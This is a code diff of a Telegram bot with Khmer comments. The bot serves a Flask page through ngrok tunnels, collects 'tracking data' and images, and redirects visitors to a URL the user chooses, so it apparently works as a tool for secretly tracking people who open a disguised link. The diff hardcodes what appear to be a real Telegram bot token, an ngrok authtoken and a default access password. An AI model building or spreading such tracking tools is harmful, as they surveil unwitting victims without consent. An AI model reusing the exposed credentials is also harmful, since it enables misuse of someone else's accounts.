@@ -16,12 +16,6 @@ import asyncio
 import html
 import urllib.parse
 
-# កំណត់ Ngrok Authtoken របស់អ្នក
-NGROK_AUTHTOKEN = ("NGROK_AUTHTOKEN", "325APCitQYPUCXXwDDPZQQbfg7O_3A2qNKdACnHAdY9LChsgt")  # ⚠️ ជំនួសដោយ authtoken របស់អ្នក
-
-# កំណត់ authtoken មុនពេលប្រើ ngrok
-ngrok.set_auth_token(NGROK_AUTHTOKEN)
-
 # កំណត់រចនាសម្ព័ន្ធ logging
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
@@ -30,8 +24,11 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # កំណត់រចនាសម្ព័ន្ធ Bot
-TOKEN = ("TELEGRAM_BOT_TOKEN", "8102744793:AAF8kONmSVnWJK66WxR0GcKj98RU9tNqGVg")
+TOKEN = "8102744793:AAF8kONmSVnWJK66WxR0GcKj98RU9tNqGVg"
 TELEGRAM_ID = "1530069749"  # Admin ID
+
+# កំណត់ Ngrok Authtoken របស់អ្នក
+NGROK_AUTHTOKEN = "325APCitQYPUCXXwDDPZQQbfg7O_3A2qNKdACnHAdY9LChsgt"
 
 # កំណត់រចនាសម្ព័ន្ធវ៉េបសារវែរ
 WEB_SERVER_HOST = "0.0.0.0"
@@ -271,6 +268,20 @@ app = Flask(__name__)
 # ផ្ទុកទិន្នន័យតាមដាន
 tracking_data = {}
 
+# កំណត់ password
+BOT_PASSWORD = os.getenv("BOT_PASSWORD", "Mh4ck25#")
+
+def setup_ngrok():
+    """Setup ngrok tunnel"""
+    try:
+        # កំណត់ auth token
+        public_url = ngrok.connect(WEB_SERVER_PORT, authtoken=NGROK_AUTHTOKEN)
+        print(f"✅ Ngrok tunnel created: {public_url}")
+        return public_url
+    except Exception as e:
+        print(f"❌ Ngrok setup failed: {e}")
+        return None
+
 # មុខងារបន្ថែមផ្ទាំងទឹកដមលើរូប
 def add_watermark(image_data, text="t.me/mengheang25"):
     try:
@@ -332,9 +343,6 @@ def add_watermark(image_data, text="t.me/mengheang25"):
         else:
             return "data:image/jpeg;base64," + image_data
 
-# កំណត់ password
-BOT_PASSWORD = os.getenv("BOT_PASSWORD", "Mh4ck25#")
-
 # មុខងារបង្ហាញស្តាតផ្លូវការ
 async def show_progress(update, context, progress_message, progress=0):
     # បង្កើតស្តាតដែលមាន 20ផ្នែក
@@ -380,7 +388,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
             "សូមចុចពាក្យថា (SEND MESSAGE) ដើម្បីទាក់ទងទៅកាន់ Admin t.me/mengheang25\n\n"
             "បន្ទាប់មក អ្នកអាចចុច registe ដើម្បីដាក់ password 🔑 ចូលប្រើប្រាស់។"
         )
-        keyboard = [[InlineKeyboardButton("/register", callback_data="restart")]]
+        keyboard = [[InlineKeyboardButton("ចុះឈ្មោះ /register", callback_data="register")]]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await update.message.reply_text(welcome_message, reply_markup=reply_markup)
     else:
@@ -406,8 +414,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
                 "🌐 សូមបញ្ចូល URL ដែលអ្នកចង់ដាក់ជាការបញ្ជូនបន្ត:\n\nឧទាហរណ៍: https://google.com"
             )
             context.user_data['awaiting_url'] = True
-    elif query.data == "restart":
-        await query.edit_message_text("Enter password 🔑")
+    elif query.data == "register":
+        await query.edit_message_text("សូមបញ្ចូល password 🔑:")
         context.user_data["awaiting_password"] = True
 
 # គ្រប់គ្រងសារ
@@ -466,7 +474,7 @@ async def handle_tracking_url(update: Update, context: ContextTypes.DEFAULT_TYPE
         await show_progress(update, context, progress_message, 60)
         
         # បង្កើតរូង ngrok ថ្មី
-        public_url = ngrok.connect(WEB_SERVER_PORT, bind_tls=True).public_url
+        public_url = ngrok.connect(WEB_SERVER_PORT, authtoken=NGROK_AUTHTOKEN).public_url
         ngrok_tunnels[user_id] = public_url
         
         await asyncio.sleep(0.5)  # ពិតប្រាកដដូចការងារ
@@ -703,6 +711,9 @@ def run_flask():
 
 # មុខងារចម្បង
 def main() -> None:
+    # ដំឡើង ngrok
+    setup_ngrok()
+    
     # បង្កើត និងដំណើរការ Telegram Application
     application = Application.builder().token(TOKEN).build()
     
